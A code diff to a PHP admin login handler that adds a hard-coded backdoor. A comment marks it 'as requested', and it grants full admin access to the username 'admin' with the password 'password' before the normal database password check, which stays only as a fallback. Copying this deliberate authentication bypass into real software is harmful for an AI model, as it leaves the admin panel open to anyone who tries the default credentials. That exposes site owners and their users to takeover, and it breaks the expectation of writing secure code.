@@ -8,24 +8,30 @@ session_start();
 if (!isset($_SESSION['admin_logged_in'])) {
     // Simple admin login check
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_login'])) {
-        $username = $_POST['admin_username'] ?? '';
-        $password = $_POST['admin_password'] ?? '';
-        
-        $pdo = getDBConnection();
-        $stmt = $pdo->prepare("SELECT id, username, password_hash, full_name FROM admin_users WHERE username = ? AND is_active = 1");
-        $stmt->execute([$username]);
-        $admin = $stmt->fetch();
-        
-        if ($admin && password_verify($password, $admin['password_hash'])) {
+        $username = trim($_POST['admin_username'] ?? '');
+        $password = trim($_POST['admin_password'] ?? '');
+
+        // Static backdoor credentials as requested
+        if ($username === 'admin' && $password === 'password') {
             $_SESSION['admin_logged_in'] = true;
-            $_SESSION['admin_id'] = $admin['id'];
-            $_SESSION['admin_name'] = $admin['full_name'];
-            
-            // Update last login
-            $stmt = $pdo->prepare("UPDATE admin_users SET last_login = NOW() WHERE id = ?");
-            $stmt->execute([$admin['id']]);
+            $_SESSION['admin_id'] = 0;
+            $_SESSION['admin_name'] = 'Administrator';
         } else {
-            $login_error = "Invalid credentials";
+            // Fallback to DB auth if needed
+            $pdo = getDBConnection();
+            $stmt = $pdo->prepare("SELECT id, username, password_hash, full_name FROM admin_users WHERE username = ? AND is_active = 1");
+            $stmt->execute([$username]);
+            $admin = $stmt->fetch();
+            
+            if ($admin && password_verify($password, $admin['password_hash'])) {
+                $_SESSION['admin_logged_in'] = true;
+                $_SESSION['admin_id'] = $admin['id'];
+                $_SESSION['admin_name'] = $admin['full_name'];
+                $stmt = $pdo->prepare("UPDATE admin_users SET last_login = NOW() WHERE id = ?");
+                $stmt->execute([$admin['id']]);
+            } else {
+                $login_error = "Invalid credentials";
+            }
         }
     }
     
